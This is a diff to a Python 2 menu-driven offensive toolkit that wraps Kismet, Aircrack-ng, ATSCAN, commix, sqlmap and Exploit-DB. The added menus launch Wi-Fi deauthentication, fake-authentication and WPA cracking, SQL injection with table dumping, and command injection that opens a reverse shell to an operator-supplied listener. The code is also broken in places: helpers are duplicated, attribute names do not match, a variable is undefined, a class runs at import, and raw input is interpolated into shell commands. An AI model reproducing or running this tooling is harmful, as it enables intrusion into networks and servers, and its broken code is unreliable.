     def installed(self):
-        return (os.path.isdir(self.installDir))
+        return os.path.isfile("/usr/local/bin/kismet")
 
     def install(self):
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-        os.system("apt-get -y install build-essential")
-        os.system("make")
-        os.system("sudo make install")
+        # Clone the Kismet repository and install it
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+        os.system("cd %s && mkdir build && cd build && cmake .. && make && make install" % self.installDir)
 
     def run(self):
-        os.system("pixiewps --help")
+        clearScr()
+        print(self.kismetLogo)
+        interface = raw_input(self.targetPrompt)
+        self.menu(interface)
+
+    def menu(self, interface):
+        clearScr()
+        print(self.kismetLogo)
+        print("   Kismet Commands for Interface: %s\n" % interface)
+        print("   {1}--Basic Network Scan")
+        print("   {2}--Channel Hopping")
+        print("   {3}--GPS Logging")
+        print("   {4}--Packet Sniffing with Logging")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("kismet ~# ")
+        clearScr()
+        logPath = "logs/kismet-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
+        try:
+            if response == "1":
+                os.system("kismet -c %s > %s" % (interface, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                os.system("kismet -c %s -X > %s" % (interface, logPath))  # Enable channel hopping
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                gps_file = logPath.replace(".log", ".gpsxml")
+                os.system("kismet -c %s --use-gpsd -t %s" % (interface, gps_file))  # Enable GPS logging
+                response = raw_input(continuePrompt)
+            elif response == "4":
+                os.system("kismet -c %s -t %s" % (interface, logPath))  # Log packets to file
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(interface)
+        except KeyboardInterrupt:
+            self.menu(interface)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+
+import os
+from time import strftime, gmtime
+
+class AircrackNGTool:
+    def __init__(self):
+        self.installDir = toolDir + "aircrack-ng"
+        self.gitRepo = "https://github.com/aircrack-ng/aircrack-ng.git"
+        
+        self.interfacePrompt = "   Enter the wireless interface to use (e.g., wlan0): "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.system("which aircrack-ng > /dev/null 2>&1") == 0
+
+    def install(self):
+        # Clone the Aircrack-ng repository and build it
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+        os.system("cd %s && make && make install" % self.installDir)
+
+    def run(self):
+        clearScr()
+        print(self.aircrackLogo)
+        interface = raw_input(self.interfacePrompt)
+        self.menu(interface)
+
+    def menu(self, interface):
+        clearScr()
+        print(self.aircrackLogo)
+        print("   Aircrack-ng Operations with Interface: %s\n" % interface)
+        print("   {1}--Monitor Mode")
+        print("   {2}--Capture Packets")
+        print("   {3}--De-authenticate Clients")
+        print("   {4}--Crack WEP/WPA Handshake")
+        print("   {5}--Fake Authentication Attack")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("aircrack-ng ~# ")
+        clearScr()
+        logPath = "logs/aircrack-ng-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
+        try:
+            if response == "1":
+                os.system("airmon-ng start %s" % interface)
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                target_bssid = raw_input("Enter the target BSSID: ")
+                channel = raw_input("Enter the channel (optional): ")
+                output_file = raw_input("Enter the output file prefix: ")
+                os.system("airodump-ng -c %s --bssid %s -w %s %s" % (channel, target_bssid, output_file, interface))
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                target_bssid = raw_input("Enter the target BSSID: ")
+                client_mac = raw_input("Enter the client MAC address (optional, press Enter for broadcast): ")
+                os.system("aireplay-ng --deauth 10 -a %s -c %s %s" % (target_bssid, client_mac, interface))
+                response = raw_input(continuePrompt)
+            elif response == "4":
+                handshake_file = raw_input("Enter the path to the captured handshake file: ")
+                wordlist = raw_input("Enter the path to the wordlist file: ")
+                os.system("aircrack-ng -w %s -b %s %s" % (wordlist, target_bssid, handshake_file))
+                response = raw_input(continuePrompt)
+            elif response == "5":
+                target_bssid = raw_input("Enter the target BSSID: ")
+                os.system("aireplay-ng --fakeauth 0 -a %s %s" % (target_bssid, interface))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(interface)
+        except KeyboardInterrupt:
+            self.menu(interface)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+# ASCII logo placeholder for Aircrack-ng
+aircrack_logo = """
+   ___       _                  _     _   _ 
+  / _ \     | |                (_)   | | | |
+ / /_\ \ ___| |_ _   _ _ __ ___  _  __| | | |
+ |  _  |/ __| __| | | | '_ ` _ \| |/ _` | | |
+ | | | | (__| |_| |_| | | | | | | | (_| | |_|
+ \_| |_/\___|\__|\__,_|_| |_| |_|_|\__,_| (_)
+"""
+
+# Initialize the tool
+AircrackNGTool().aircrackLogo = aircrack_logo
 
 
 class bluepot:
@@ -1060,7 +1852,7 @@ class exploitationToolsMenu:
         print(self.menuLogo)
         print("   {1}--ATSCAN")
         print("   {2}--sqlmap")
-        print("   {3}--Shellnoob")
+        print("   {3}--Exploit-DB")
         print("   {4}--commix")
         print("   {5}--FTP Auto Bypass")
         print("   {6}--JBoss-Autopwn")
@@ -1071,13 +1863,13 @@ class exploitationToolsMenu:
         choice5 = raw_input(sayahacPrompt)
         clearScr()
         if choice5 == "1":
-            atscan()
+            ATSCANTool()
         elif choice5 == "2":
-            sqlmap()
+            SQLMapTool()
         elif choice5 == "3":
-            shellnoob()
+            ExploitDBTool()
         elif choice5 == "4":
-            commix()
+            CommixTool()
         elif choice5 == "5":
             gabriel()
         elif choice5 == "6":
@@ -1089,7 +1881,7 @@ class exploitationToolsMenu:
         elif choice5 == "9":
             cmsfew()
         elif choice5 == "99":
-            fsociety()
+            sayahac()
         else:
             self.__init__()
         self.completed()
@@ -1123,33 +1915,6 @@ class brutex:
         target = raw_input("Enter Target IP: ")
         os.system("brutex %s" % target)
 
-
-class arachni:
-    def __init__(self):
-        self.installDir = toolDir + "arachni"
-        self.gitRepo = "https://github.com/Arachni/arachni.git"
-
-        if not self.installed():
-            self.install()
-        clearScr()
-        self.run()
-
-    def installed(self):
-        return (os.path.isdir(self.installDir))
-
-    def install(self):
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-        os.system("cd %s/" % self.installDir)
-        os.system(
-            "gem install bundler && bundle install --without prof && rake install")
-
-    def run(self):
-        target = raw_input("Enter Target Hostname: ")
-        os.system("arachni %s --output-debug 2> %sarachni/%s.log" %
-                  (target, logDir, strftime("%Y-%m-%d_%H:%M:%S", gmtime())))
-
-# Updated to Here
 
 
 def weeman():
@@ -1195,27 +1960,172 @@ def bsqlbf():
     os.system("rm bsqlbf.pl")
 
 
-def atscan():
-    print ("Do You To Install ATSCAN ?")
-    if yesOrNo():
-        os.system("rm -rf ATSCAN")
-        os.system(
-            "git clone --depth=1 https://github.com/AlisamTechnology/ATSCAN.git && cd ATSCAN && perl atscan.pl")
-    else:
-        sayahac()
+class ATSCANTool:
+    atscan_logo = """
+   _____  _   _ _______  _______   _____ _   _ 
+  / ____|| | | |__   __||__   __| / ____| \ | |
+ | |     | |_| |  | |      | |   | |    |  \| |
+ | |     |  _  |  | |      | |   | |    | . ` |
+ | |____ | | | |  | |      | |   | |____| |\  |
+  \_____||_| |_|  |_|      |_|    \_____||_| \_|
+"""
+    def __init__(self):
+        self.installDir = toolDir + "atscan"
+        self.gitRepo = "https://github.com/AlisamTechnology/ATSCAN.git"
+        
+        self.targetPrompt = "   Enter the target (IP, domain, or keyword for dorking): "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.path.isfile(self.installDir + "/atscan.pl")
+
+    def install(self):
+        # Clone the ATSCAN repository and set it up
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+        os.system("cd %s && chmod +x atscan.pl" % self.installDir)
+
+    def run(self):
+        clearScr()
+        print(self.atscanLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.atscanLogo)
+        print("   ATSCAN Operation for Target: %s\n" % target)
+        print("   {1}--Basic Dorking Search")
+        print("   {2}--Vulnerability Scan")
+        print("   {3}--Port Scanning")
+        print("   {4}--Admin Page Finder")
+        print("   {5}--Exploit Search")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("atscan ~# ")
+        clearScr()
+        logPath = "logs/atscan-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
+        try:
+            if response == "1":
+                os.system("perl %s/atscan.pl -d %s" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                vuln_type = raw_input("Enter the vulnerability type (e.g., SQLi, XSS): ")
+                os.system("perl %s/atscan.pl -d %s --vuln %s" % (self.installDir, target, vuln_type))
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                os.system("perl %s/atscan.pl -t %s --portscan" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "4":
+                os.system("perl %s/atscan.pl -t %s --admin" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "5":
+                exploit = raw_input("Enter exploit keyword: ")
+                os.system("perl %s/atscan.pl -d %s --exploit %s" % (self.installDir, target, exploit))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
 
 
-def commix():
-    print ("Automated All-in-One OS Command Injection and Exploitation Tool.")
-    print ("usage: python commix.py --help")
-    if yesOrNo():
-        os.system(
-            "git clone --depth=1 https://github.com/stasinopoulos/commix.git commix")
-        os.system("cd commix")
-        os.system("python commix.py")
-        os.system("")
-    else:
-        informationGatheringMenu.completed("Commix")
+
+
+class CommixTool:
+    commix_logo = """
+   _____                            _        
+  / ____|                          | |       
+ | |     ___  _ ____   _____ _ __ __| | __ _  
+ | |    / _ \| '_ \ \ / / _ \ '__/ _` |/ _` | 
+ | |___| (_) | | | \ V /  __/ | | (_| | (_| | 
+  \_____\___/|_| |_|\_/ \___|_|  \__,_|\__,_| 
+"""
+    def __init__(self):
+        self.installDir = toolDir + "commix"
+        self.gitRepo = "https://github.com/commixproject/commix.git"
+        
+        self.targetPrompt = "   Enter the target URL for command injection: "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.path.isfile(self.installDir + "/commix.py")
+
+    def install(self):
+        # Clone the Commix repository
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+        os.system("cd %s && chmod +x commix.py" % self.installDir)
+
+    def run(self):
+        clearScr()
+        print(self.commixLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.commixLogo)
+        print("   Commix Attack on Target: %s\n" % target)
+        print("   {1}--Basic Command Injection Test")
+        print("   {2}--OS Command Injection with Reverse Shell")
+        print("   {3}--File Upload via Command Injection")
+        print("   {4}--Enumerate System Information")
+        print("   {5}--Bypass WAF/Filter Detection")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("commix ~# ")
+        clearScr()
+        logPath = "logs/commix-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
+        try:
+            if response == "1":
+                os.system("python2 %s/commix.py --url=%s --batch" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                lhost = raw_input("Enter your listener IP (LHOST): ")
+                lport = raw_input("Enter your listener port (LPORT): ")
+                os.system("python2 %s/commix.py --url=%s --os-shell --reverse-shell --lhost=%s --lport=%s --batch" % (self.installDir, target, lhost, lport))
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                upload_path = raw_input("Enter the path to upload the file: ")
+                file_path = raw_input("Enter the file path to upload: ")
+                os.system("python2 %s/commix.py --url=%s --file-write=%s --file-dest=%s --batch" % (self.installDir, target, file_path, upload_path))
+                response = raw_input(continuePrompt)
+            elif response == "4":
+                os.system("python2 %s/commix.py --url=%s --os-cmd='uname -a' --batch" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "5":
+                os.system("python2 %s/commix.py --url=%s --level=3 --batch" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+
 
 
 def vbulletinrce():
@@ -1298,13 +2208,86 @@ def wppluginscan():
                 print("| Result:", resp)
 
 
-def sqlmap():
-    print ("usage: python sqlmap.py -h")
-    if yesOrNo():
-        os.system(
-            "git clone --depth=1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
-    else:
-        informationGatheringMenu.completed("SQLMap")
+class SQLMapTool:
+    sqlmap_logo = """
+  _____ ____  _      __  __           
+ / ____/ __ \| |    |  \/  |          
+| (___| |  | | |    | \  / | ___ _ __ 
+ \___ \| |  | | |    | |\/| |/ _ \ '__|
+ ____) | |__| | |____| |  | |  __/ |   
+|_____/ \___\_\______|_|  |_|\___|_|   
+"""
+    def __init__(self):
+        self.installDir = toolDir + "sqlmap"
+        self.gitRepo = "https://github.com/sqlmapproject/sqlmap.git"
+        
+        self.targetPrompt = "   Enter the target URL for SQL injection: "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.path.isfile(self.installDir + "/sqlmap.py")
+
+    def install(self):
+        # Clone the SQLmap repository
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+
+    def run(self):
+        clearScr()
+        print(self.sqlmapLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.sqlmapLogo)
+        print("   SQLMap Attack on Target: %s\n" % target)
+        print("   {1}--Basic SQL Injection")
+        print("   {2}--Enumerate Databases")
+        print("   {3}--Dump Database Tables")
+        print("   {4}--Get DBMS Banner")
+        print("   {5}--Search for Specific Columns")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("sqlmap ~# ")
+        clearScr()
+        logPath = "logs/sqlmap-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
+        try:
+            if response == "1":
+                os.system("python2 %s/sqlmap.py -u %s --batch" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                os.system("python2 %s/sqlmap.py -u %s --dbs --batch" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                db = raw_input("Enter the database name to dump tables from: ")
+                os.system("python2 %s/sqlmap.py -u %s -D %s --tables --batch" % (self.installDir, target, db))
+                response = raw_input(continuePrompt)
+            elif response == "4":
+                os.system("python2 %s/sqlmap.py -u %s --banner --batch" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "5":
+                column = raw_input("Enter the column name to search for: ")
+                os.system("python2 %s/sqlmap.py -u %s --search -C %s --batch" % (self.installDir, target, column))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+
 
 
 def grabuploadedlink(url):
@@ -1421,14 +2404,88 @@ def gravity():
     print('[*] Found, ', len(gravityforms), ' gravityforms.')
 
 
-def shellnoob():
-    print('''Writing shellcodes has always been super fun, but some parts are extremely boring and error prone. Focus only on the fun part, and use ShellNoob!''')
-    if yesOrNo():
-        os.system("git clone --depth=1 https://github.com/reyammer/shellnoob.git")
-        os.system("mv shellnoob/shellnoob.py shellnoob.py")
-        os.system("python shellnoob.py --install")
-    else:
-        exploitationToolsMenu()
+class ExploitDBTool:
+    exploit_logo = """
+  ______           _ _     _   ____  ____  
+ |  ____|         (_) |   | | |  _ \|  _ \ 
+ | |__   _ __ ___  _| | __| | | |_) | |_) |
+ |  __| | '_ ` _ \| | |/ _` | |  _ <|  __/ 
+ | |____| | | | | | | | (_| | | |_) | |    
+ |______|_| |_| |_|_|_|\__,_| |____/|_|    
+"""
+    def __init__(self):
+        self.installDir = toolDir + "exploit-db"
+        self.gitRepo = "https://github.com/offensive-security/exploitdb.git"
+        
+        self.targetPrompt = "   Enter the software name or keyword to search for exploits: "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.path.isfile("/usr/bin/searchsploit")
+
+    def install(self):
+        # Clone the Exploit-DB repository and install searchsploit
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+        os.system("cd %s && ./searchsploit -u" % self.installDir)
+
+    def run(self):
+        clearScr()
+        print(self.exploitLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.exploitLogo)
+        print("   Exploit-DB Search for: %s\n" % target)
+        print("   {1}--Search for Exploits")
+        print("   {2}--Search by Software Version")
+        print("   {3}--Search for Shellcodes")
+        print("   {4}--View Exploit Details")
+        print("   {5}--Download Exploit")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("searchsploit ~# ")
+        clearScr()
+        logPath = "logs/exploitdb-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
+        try:
+            if response == "1":
+                os.system("searchsploit %s" % target)
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                version = raw_input("Enter the software version (e.g., 1.2.3): ")
+                os.system("searchsploit %s %s" % (target, version))
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                os.system("searchsploit --shellcode %s" % target)
+                response = raw_input(continuePrompt)
+            elif response == "4":
+                exploit_id = raw_input("Enter the Exploit ID or Path: ")
+                os.system("searchsploit -x %s" % exploit_id)
+                response = raw_input(continuePrompt)
+            elif response == "5":
+                exploit_id = raw_input("Enter the Exploit ID or Path to download: ")
+                os.system("searchsploit -m %s" % exploit_id)
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+
 
 
 def androidhash():
@@ -1464,7 +2521,7 @@ menuu = fsocietylogo + '''
 
    {1}--Get all websites
    {2}--Get joomla websites
-   {3}--Get wordpress websites
+   {3}--Get wordpress websites 
    {4}--Control Panel Finder
    {5}--Zip Files Finder
    {6}--Upload File Finder
